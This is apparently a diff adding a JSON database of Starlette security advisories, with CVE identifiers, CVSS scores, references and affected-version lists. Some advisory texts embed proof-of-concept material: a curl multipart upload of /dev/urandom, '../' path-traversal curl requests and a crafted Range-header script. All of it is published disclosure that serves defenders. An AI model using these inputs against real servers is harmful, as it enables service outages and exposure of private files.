+        "0.13.6"
+      ]
+    },
+    {
+      "id": "GHSA-f96h-pmfr-66vw",
+      "primary_id": "CVE-2024-47874",
+      "aliases": [
+        "CVE-2024-47874"
+      ],
+      "cve_ids": [
+        "CVE-2024-47874"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "starlette",
+      "summary": "Starlette Denial of service (DoS) via multipart/form-data",
+      "details": "### Summary\nStarlette treats `multipart/form-data` parts without a `filename` as text form fields and buffers those in byte strings with no size limit. This allows an attacker to upload arbitrary large form fields and cause Starlette to both slow down significantly due to excessive memory allocations and copy operations, and also consume more and more memory until the server starts swapping and grinds to a halt, or the OS terminates the server process with an OOM error. Uploading multiple such requests in parallel may be enough to render a service practically unusable, even if reasonable request size limits are enforced by a reverse proxy in front of Starlette.\n\n### PoC\n\n```python\nfrom starlette.applications import Starlette\nfrom starlette.routing import Route\n\nasync def poc(request):\n    async with request.form():\n        pass\n\napp = Starlette(routes=[\n    Route('/', poc, methods=[\"POST\"]),\n])\n```\n\n```sh\ncurl http://localhost:8000 -F 'big=</dev/urandom'\n```\n\n### Impact\nThis Denial of service (DoS) vulnerability affects all applications built with Starlette (or FastAPI) accepting form requests.\n",
+      "published": "2024-10-15T18:12:57Z",
+      "modified": "2026-02-04T02:24:15.176025Z",
+      "severity": {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N"
+        },
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/encode/starlette/security/advisories/GHSA-f96h-pmfr-66vw"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-47874"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/encode/starlette/commit/fd038f3070c302bff17ef7d173dbb0b007617733"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/encode/starlette"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-f96h-pmfr-66vw",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.40.0"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.1.0",
+        "0.1.1",
+        "0.1.10",
+        "0.1.11",
+        "0.1.12",
+        "0.1.13",
+        "0.1.14",
+        "0.1.15",
+        "0.1.16",
+        "0.1.17",
+        "0.1.2",
+        "0.1.3",
+        "0.1.4",
+        "0.1.5",
+        "0.1.6",
+        "0.1.7",
+        "0.1.8",
+        "0.1.9",
+        "0.10.0",
+        "0.10.1",
+        "0.10.2",
+        "0.10.3",
+        "0.10.4",
+        "0.10.5",
+        "0.10.6",
+        "0.10.7",
+        "0.11.0",
+        "0.11.1",
+        "0.11.2",
+        "0.11.3",
+        "0.11.4",
+        "0.12.0",
+        "0.12.0b1",
+        "0.12.0b2",
+        "0.12.0b3",
+        "0.12.1",
+        "0.12.10",
+        "0.12.11",
+        "0.12.12",
+        "0.12.13",
+        "0.12.2",
+        "0.12.3",
+        "0.12.4",
+        "0.12.5",
+        "0.12.6",
+        "0.12.7",
+        "0.12.8",
+        "0.12.9",
+        "0.13.0",
+        "0.13.1",
+        "0.13.2",
+        "0.13.3",
+        "0.13.4",
+        "0.13.5",
+        "0.13.6",
+        "0.13.7",
+        "0.13.8",
+        "0.14.0",
+        "0.14.1",
+        "0.14.2",
+        "0.15.0",
+        "0.16.0",
+        "0.17.0",
+        "0.17.1",
+        "0.18.0",
+        "0.19.0",
+        "0.19.1",
+        "0.2.0",
+        "0.2.1",
+        "0.2.2",
+        "0.2.3",
+        "0.20.0",
+        "0.20.1",
+        "0.20.2",
+        "0.20.3",
+        "0.20.4",
+        "0.21.0",
+        "0.22.0",
+        "0.23.0",
+        "0.23.1",
+        "0.24.0",
+        "0.25.0",
+        "0.26.0",
+        "0.26.0.post1",
+        "0.26.1",
+        "0.27.0",
+        "0.28.0",
+        "0.29.0",
+        "0.3.0",
+        "0.3.1",
+        "0.3.2",
+        "0.3.3",
+        "0.3.4",
+        "0.3.5",
+        "0.3.6",
+        "0.3.7",
+        "0.30.0",
+        "0.31.0",
+        "0.31.1",
+        "0.32.0",
+        "0.32.0.post1",
+        "0.33.0",
+        "0.34.0",
+        "0.35.0",
+        "0.35.1",
+        "0.36.0",
+        "0.36.1",
+        "0.36.2",
+        "0.36.3",
+        "0.37.0",
+        "0.37.1",
+        "0.37.2",
+        "0.38.0",
+        "0.38.1",
+        "0.38.2",
+        "0.38.3",
+        "0.38.4",
+        "0.38.5",
+        "0.38.6",
+        "0.39.0",
+        "0.39.1",
+        "0.39.2",
+        "0.4.0",
+        "0.4.1",
+        "0.4.2",
+        "0.5.0",
+        "0.5.1",
+        "0.5.2",
+        "0.5.3",
+        "0.5.4",
+        "0.5.5",
+        "0.6.0",
+        "0.6.1",
+        "0.6.2",
+        "0.6.3",
+        "0.7.0",
+        "0.7.1",
+        "0.7.2",
+        "0.7.3",
+        "0.7.4",
+        "0.8.0",
+        "0.8.1",
+        "0.8.2",
+        "0.8.3",
+        "0.8.4",
+        "0.8.5",
+        "0.8.6",
+        "0.8.7",
+        "0.8.8",
+        "0.9.0",
+        "0.9.1",
+        "0.9.10",
+        "0.9.11",
+        "0.9.2",
+        "0.9.3",
+        "0.9.4",
+        "0.9.5",
+        "0.9.6",
+        "0.9.7",
+        "0.9.8",
+        "0.9.9"
+      ],
+      "affected_conda_versions": [
+        "0.13.5",
+        "0.13.6"
+      ]
+    },
+    {
+      "id": "GHSA-qj8w-rv5x-2v9h",
+      "primary_id": "GHSA-qj8w-rv5x-2v9h",
+      "aliases": [],
+      "cve_ids": [],
+      "ecosystem": "PyPI",
+      "upstream_name": "starlette",
+      "summary": "Duplicate Advisory: Starlette vulnerable to directory traversal",
+      "details": "## Duplicate Advisory\nThis advisory has been withdrawn because it is a duplicate of GHSA-v5gw-mw7f-84px. This link is maintained to preserve external references.\n\n## Original Description\nDirectory traversal vulnerability in Starlette versions 0.13.5 and later and prior to 0.27.0 allows a remote unauthenticated attacker to view files in a web service which was built using Starlette.",
+      "published": "2023-06-01T03:30:24Z",
+      "modified": "2025-02-18T06:19:36.795705Z",
+      "severity": {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/encode/starlette/security/advisories/GHSA-v5gw-mw7f-84px"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-29159"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/encode/starlette/commit/1797de464124b090f10cf570441e8292936d63e3"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/encode/starlette"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/encode/starlette/releases/tag/0.27.0"
+        },
+        {
+          "type": "WEB",
+          "url": "https://jvn.jp/en/jp/JVN95981715"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-qj8w-rv5x-2v9h",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0.13.5"
+            },
+            {
+              "fixed": "0.27.0"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.13.5",
+        "0.13.6",
+        "0.13.7",
+        "0.13.8",
+        "0.14.0",
+        "0.14.1",
+        "0.14.2",
+        "0.15.0",
+        "0.16.0",
+        "0.17.0",
+        "0.17.1",
+        "0.18.0",
+        "0.19.0",
+        "0.19.1",
+        "0.20.0",
+        "0.20.1",
+        "0.20.2",
+        "0.20.3",
+        "0.20.4",
+        "0.21.0",
+        "0.22.0",
+        "0.23.0",
+        "0.23.1",
+        "0.24.0",
+        "0.25.0",
+        "0.26.0",
+        "0.26.0.post1",
+        "0.26.1"
+      ],
+      "affected_conda_versions": [
+        "0.13.5",
+        "0.13.6"
+      ]
+    },
+    {
+      "id": "GHSA-v5gw-mw7f-84px",
+      "primary_id": "CVE-2023-29159",
+      "aliases": [
+        "CVE-2023-29159",
+        "PYSEC-2023-83"
+      ],
+      "cve_ids": [
+        "CVE-2023-29159"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "starlette",
+      "summary": "Starlette has Path Traversal vulnerability in StaticFiles",
+      "details": "### Summary\nWhen using `StaticFiles`, if there's a file or directory that starts with the same name as the `StaticFiles` directory, that file or directory is also exposed via `StaticFiles` which is a path traversal vulnerability.\n\n### Details\nThe root cause of this issue is the usage of `os.path.commonprefix()`:\nhttps://github.com/encode/starlette/blob/4bab981d9e870f6cee1bd4cd59b87ddaf355b2dc/starlette/staticfiles.py#L172-L174\n\nAs stated in the Python documentation (https://docs.python.org/3/library/os.path.html#os.path.commonprefix) this function returns the longest prefix common to paths.\n\nWhen passing a path like `/static/../static1.txt`, `os.path.commonprefix([full_path, directory])` returns `./static` which is the common part of `./static1.txt` and `./static`, It refers to `/static/../static1.txt` because it is considered in the staticfiles directory. As a result, it becomes possible to view files that should not be open to the public.\n\nThe solution is to use `os.path.commonpath` as the Python documentation explains that `os.path.commonprefix` works a character at a time, it does not treat the arguments as paths.\n\n### PoC\nIn order to reproduce the issue, you need to create the following structure:\n\n```\n\u251c\u2500\u2500 static\n\u2502   \u251c\u2500\u2500 index.html\n\u251c\u2500\u2500 static_disallow\n\u2502   \u251c\u2500\u2500 index.html\n\u2514\u2500\u2500 static1.txt\n```\n\nAnd run the `Starlette` app with:\n\n```py\nimport uvicorn\nfrom starlette.applications import Starlette\nfrom starlette.routing import Mount\nfrom starlette.staticfiles import StaticFiles\n\n\nroutes = [\n    Mount(\"/static\", app=StaticFiles(directory=\"static\", html=True), name=\"static\"),\n]\n\napp = Starlette(routes=routes)\n\n\nif __name__ == \"__main__\":\n    uvicorn.run(app, host=\"0.0.0.0\", port=8000)\n```\n\nAnd running the commands:\n\n```shell\ncurl --path-as-is 'localhost:8000/static/../static_disallow/'\ncurl --path-as-is 'localhost:8000/static/../static1.txt'\n```\nThe `static1.txt` and the directory `static_disallow` are exposed.\n\n### Impact\nConfidentiality is breached: An attacker may obtain files that should not be open to the public.\n\n### Credits\nSecurity researcher **Masashi Yamane of LAC Co., Ltd** reported this vulnerability to **JPCERT/CC Vulnerability Coordination Group** and they contacted us to coordinate a patch for the security issue.\n",
+      "published": "2023-05-17T03:49:14Z",
+      "modified": "2026-03-13T22:00:10.248807Z",
+      "severity": {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N"
+        },
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/encode/starlette/security/advisories/GHSA-v5gw-mw7f-84px"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-29159"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/encode/starlette/commit/1797de464124b090f10cf570441e8292936d63e3"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/encode/starlette"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/encode/starlette/blob/4bab981d9e870f6cee1bd4cd59b87ddaf355b2dc/starlette/staticfiles.py#L172-L174"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/encode/starlette/releases/tag/0.27.0"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pypa/advisory-database/tree/main/vulns/starlette/PYSEC-2023-83.yaml"
+        },
+        {
+          "type": "WEB",
+          "url": "https://jvn.jp/en/jp/JVN95981715"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-v5gw-mw7f-84px",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0.13.5"
+            },
+            {
+              "fixed": "0.27.0"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.13.5",
+        "0.13.6",
+        "0.13.7",
+        "0.13.8",
+        "0.14.0",
+        "0.14.1",
+        "0.14.2",
+        "0.15.0",
+        "0.16.0",
+        "0.17.0",
+        "0.17.1",
+        "0.18.0",
+        "0.19.0",
+        "0.19.1",
+        "0.20.0",
+        "0.20.1",
+        "0.20.2",
+        "0.20.3",
+        "0.20.4",
+        "0.21.0",
+        "0.22.0",
+        "0.23.0",
+        "0.23.1",
+        "0.24.0",
+        "0.25.0",
+        "0.26.0",
+        "0.26.0.post1",
+        "0.26.1"
+      ],
+      "affected_conda_versions": [
+        "0.13.5",
+        "0.13.6"
+      ]
+    },
+    {
+      "id": "PYSEC-2023-48",
+      "primary_id": "CVE-2023-30798",
+      "aliases": [
+        "CVE-2023-30798",
+        "GHSA-74m5-2c7w-9w3x"
+      ],
+      "cve_ids": [
+        "CVE-2023-30798"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "starlette",
+      "summary": null,
+      "details": "There MultipartParser usage in Encode's Starlette python framework before versions 0.25.0 allows an unauthenticated and remote attacker to specify any number of form fields or files which can cause excessive memory usage resulting in denial of service of the HTTP service.",
+      "published": "2023-04-21T16:15:00Z",
+      "modified": "2024-10-28T15:41:59.716521Z",
+      "severity": null,
+      "all_severity": [],
+      "references": [
+        {
+          "type": "ADVISORY",
+          "url": "https://vulncheck.com/advisories/starlette-multipartparser-dos"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://github.com/encode/starlette/security/advisories/GHSA-74m5-2c7w-9w3x"
+        },
+        {
+          "type": "FIX",
+          "url": "https://github.com/encode/starlette/commit/8c74c2c8dba7030154f8af18e016136bea1938fa"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/PYSEC-2023-48",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.25.0"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.1.0",
+        "0.1.1",
+        "0.1.10",
+        "0.1.11",
+        "0.1.12",
+        "0.1.13",
+        "0.1.14",
+        "0.1.15",
+        "0.1.16",
+        "0.1.17",
+        "0.1.2",
+        "0.1.3",
+        "0.1.4",
+        "0.1.5",
+        "0.1.6",
+        "0.1.7",
+        "0.1.8",
+        "0.1.9",
+        "0.10.0",
+        "0.10.1",
+        "0.10.2",
+        "0.10.3",
+        "0.10.4",
+        "0.10.5",
+        "0.10.6",
+        "0.10.7",
+        "0.11.0",
+        "0.11.1",
+        "0.11.2",
+        "0.11.3",
+        "0.11.4",
+        "0.12.0",
+        "0.12.0b1",
+        "0.12.0b2",
+        "0.12.0b3",
+        "0.12.1",
+        "0.12.10",
+        "0.12.11",
+        "0.12.12",
+        "0.12.13",
+        "0.12.2",
+        "0.12.3",
+        "0.12.4",
+        "0.12.5",
+        "0.12.6",
+        "0.12.7",
+        "0.12.8",
+        "0.12.9",
+        "0.13.0",
+        "0.13.1",
+        "0.13.2",
+        "0.13.3",
+        "0.13.4",
+        "0.13.5",
+        "0.13.6",
+        "0.13.7",
+        "0.13.8",
+        "0.14.0",
+        "0.14.1",
+        "0.14.2",
+        "0.15.0",
+        "0.16.0",
+        "0.17.0",
+        "0.17.1",
+        "0.18.0",
+        "0.19.0",
+        "0.19.1",
+        "0.2.0",
+        "0.2.1",
+        "0.2.2",
+        "0.2.3",
+        "0.20.0",
+        "0.20.1",
+        "0.20.2",
+        "0.20.3",
+        "0.20.4",
+        "0.21.0",
+        "0.22.0",
+        "0.23.0",
+        "0.23.1",
+        "0.24.0",
+        "0.3.0",
+        "0.3.1",
+        "0.3.2",
+        "0.3.3",
+        "0.3.4",
+        "0.3.5",
+        "0.3.6",
+        "0.3.7",
+        "0.4.0",
+        "0.4.1",
+        "0.4.2",
+        "0.5.0",
+        "0.5.1",
+        "0.5.2",
+        "0.5.3",
+        "0.5.4",
+        "0.5.5",
+        "0.6.0",
+        "0.6.1",
+        "0.6.2",
+        "0.6.3",
+        "0.7.0",
+        "0.7.1",
+        "0.7.2",
+        "0.7.3",
+        "0.7.4",
+        "0.8.0",
+        "0.8.1",
+        "0.8.2",
+        "0.8.3",
+        "0.8.4",
+        "0.8.5",
+        "0.8.6",
+        "0.8.7",
+        "0.8.8",
+        "0.9.0",
+        "0.9.1",
+        "0.9.10",
+        "0.9.11",
+        "0.9.2",
+        "0.9.3",
+        "0.9.4",
+        "0.9.5",
+        "0.9.6",
+        "0.9.7",
+        "0.9.8",
+        "0.9.9"
+      ],
+      "affected_conda_versions": [
+        "0.13.5",
+        "0.13.6"
+      ]
+    },
+    {
+      "id": "PYSEC-2023-83",
+      "primary_id": "CVE-2023-29159",
+      "aliases": [
+        "CVE-2023-29159",
+        "GHSA-v5gw-mw7f-84px"
+      ],
+      "cve_ids": [
+        "CVE-2023-29159"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "starlette",
+      "summary": null,
+      "details": "Directory traversal vulnerability in Starlette versions 0.13.5 and later and prior to 0.27.0 allows a remote unauthenticated attacker to view files in a web service which was built using Starlette.",
+      "published": "2023-06-01T02:15:00Z",
+      "modified": "2023-11-08T04:12:16.846611Z",
+      "severity": null,
+      "all_severity": [],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/encode/starlette/releases/tag/0.27.0"
+        },
+        {
+          "type": "WEB",
+          "url": "https://jvn.jp/en/jp/JVN95981715/"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://github.com/encode/starlette/security/advisories/GHSA-v5gw-mw7f-84px"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/PYSEC-2023-83",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0.13.5"
+            },
+            {
+              "fixed": "0.27.0"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.13.5",
+        "0.13.6",
+        "0.13.7",
+        "0.13.8",
+        "0.14.0",
+        "0.14.1",
+        "0.14.2",
+        "0.15.0",
+        "0.16.0",
+        "0.17.0",
+        "0.17.1",
+        "0.18.0",
+        "0.19.0",
+        "0.19.1",
+        "0.20.0",
+        "0.20.1",
+        "0.20.2",
+        "0.20.3",
+        "0.20.4",
+        "0.21.0",
+        "0.22.0",
+        "0.23.0",
+        "0.23.1",
+        "0.24.0",
+        "0.25.0",
+        "0.26.0",
+        "0.26.0.post1",
+        "0.26.1"
+      ],
+      "affected_conda_versions": [
+        "0.13.5",
+        "0.13.6"
+      ]
+    },
+    {
+      "id": "GHSA-7f5h-v6xp-fcq8",
+      "primary_id": "CVE-2025-62727",
+      "aliases": [
+        "CVE-2025-62727"
+      ],
+      "cve_ids": [
+        "CVE-2025-62727"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "starlette",
+      "summary": "Starlette vulnerable to O(n^2) DoS via Range header merging in ``starlette.responses.FileResponse``",
+      "details": "### Summary\nAn unauthenticated attacker can send a crafted HTTP Range header that triggers quadratic-time processing in Starlette's `FileResponse` Range parsing/merging logic. This enables CPU exhaustion per request, causing denial\u2011of\u2011service for endpoints serving files (e.g., `StaticFiles` or any use of `FileResponse`).\n\n### Details\nStarlette parses multi-range requests in ``FileResponse._parse_range_header()``, then merges ranges using an O(n^2) algorithm.\n\n```python\n# starlette/responses.py\n_RANGE_PATTERN = re.compile(r\"(\\d*)-(\\d*)\") # vulnerable to O(n^2) complexity ReDoS\n\nclass FileResponse(Response):\n    @staticmethod\n    def _parse_range_header(http_range: str, file_size: int) -> list[tuple[int, int]]:\n        ranges: list[tuple[int, int]] = []\n        try:\n            units, range_ = http_range.split(\"=\", 1)\n        except ValueError:\n            raise MalformedRangeHeader()\n\n        # [...]\n\n        ranges = [\n            (\n                int(_[0]) if _[0] else file_size - int(_[1]),\n                int(_[1]) + 1 if _[0] and _[1] and int(_[1]) < file_size else file_size,\n            )\n            for _ in _RANGE_PATTERN.findall(range_) # vulnerable\n            if _ != (\"\", \"\")\n        ]\n\n```\n\nThe parsing loop of ``FileResponse._parse_range_header()`` uses the regular expression which vulnerable to denial of service for its O(n^2) complexity. A crafted `Range` header can maximize its complexity.\n\nThe merge loop processes each input range by scanning the entire result list, yielding quadratic behavior with many disjoint ranges. A crafted Range header with many small, non-overlapping ranges (or specially shaped numeric substrings) maximizes comparisons.\n\n  This affects any Starlette application that uses:\n\n  - ``starlette.staticfiles.StaticFiles`` (internally returns `FileResponse`) \u2014 `starlette/staticfiles.py:178`\n  - Direct ``starlette.responses.FileResponse`` responses\n\n### PoC\n```python\n#!/usr/bin/env python3\n\nimport sys\nimport time\n\ntry:\n    import starlette\n    from starlette.responses import FileResponse\nexcept Exception as e:\n    print(f\"[ERROR] Failed to import starlette: {e}\")\n    sys.exit(1)\n\n\ndef build_payload(length: int) -> str:\n    \"\"\"Build the Range header value body: '0' * num_zeros + '0-'\"\"\"\n    return (\"0\" * length) + \"a-\"\n\n\ndef test(header: str, file_size: int) -> float:\n    start = time.perf_counter()\n    try:\n        FileResponse._parse_range_header(header, file_size)\n    except Exception:\n        pass\n    end = time.perf_counter()\n    elapsed = end - start\n    return elapsed\n\n\ndef run_once(num_zeros: int) -> None:\n    range_body = build_payload(num_zeros)\n    header = \"bytes=\" + range_body\n    # Use a sufficiently large file_size so upper bounds default to file size\n    file_size = max(len(range_body) + 10, 1_000_000)\n    \n    print(f\"[DEBUG] range_body length: {len(range_body)} bytes\")\n    elapsed_time = test(header, file_size)\n    print(f\"[DEBUG] elapsed time: {elapsed_time:.6f} seconds\\n\")\n\n\nif __name__ == \"__main__\":\n    print(f\"[INFO] Starlette Version: {starlette.__version__}\")\n    for n in [5000, 10000, 20000, 40000]:\n        run_once(n)\n\n\"\"\"\n$ python3 poc_dos_range.py\n[INFO] Starlette Version: 0.48.0\n[DEBUG] range_body length: 5002 bytes\n[DEBUG] elapsed time: 0.053932 seconds\n\n[DEBUG] range_body length: 10002 bytes\n[DEBUG] elapsed time: 0.209770 seconds\n\n[DEBUG] range_body length: 20002 bytes\n[DEBUG] elapsed time: 0.885296 seconds\n\n[DEBUG] range_body length: 40002 bytes\n[DEBUG] elapsed time: 3.238832 seconds\n\"\"\"\n```\n\n### Impact\nAny Starlette app serving files via FileResponse or StaticFiles; frameworks built on Starlette (e.g., FastAPI) are indirectly impacted when using file-serving endpoints. Unauthenticated remote attackers can exploit this via a single HTTP request with a crafted Range header.",
+      "published": "2025-10-28T20:38:01Z",
+      "modified": "2026-05-11T00:26:13.095297882Z",
+      "severity": {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/Kludex/starlette/security/advisories/GHSA-7f5h-v6xp-fcq8"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-62727"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/Kludex/starlette/commit/4ea6e22b489ec388d6004cfbca52dd5b147127c5"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/Kludex/starlette/commit/69ed26a85956ef4bd0161807eb27abf49be7cd3c"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/Kludex/starlette"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/Kludex/starlette/releases/tag/0.49.1"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-7f5h-v6xp-fcq8",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0.39.0"
+            },
+            {
+              "fixed": "0.49.1"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.39.0",
+        "0.39.1",
+        "0.39.2",
+        "0.40.0",
+        "0.41.0",
+        "0.41.1",
+        "0.41.2",
+        "0.41.3",
+        "0.42.0",
+        "0.43.0",
+        "0.44.0",
+        "0.45.0",
+        "0.45.1",
+        "0.45.2",
+        "0.45.3",
+        "0.46.0",
+        "0.46.1",
+        "0.46.2",
+        "0.47.0",
+        "0.47.1",
+        "0.47.2",
+        "0.47.3",
+        "0.48.0",
+        "0.49.0"
+      ],
+      "affected_conda_versions": []
+    }
+  ]
+}
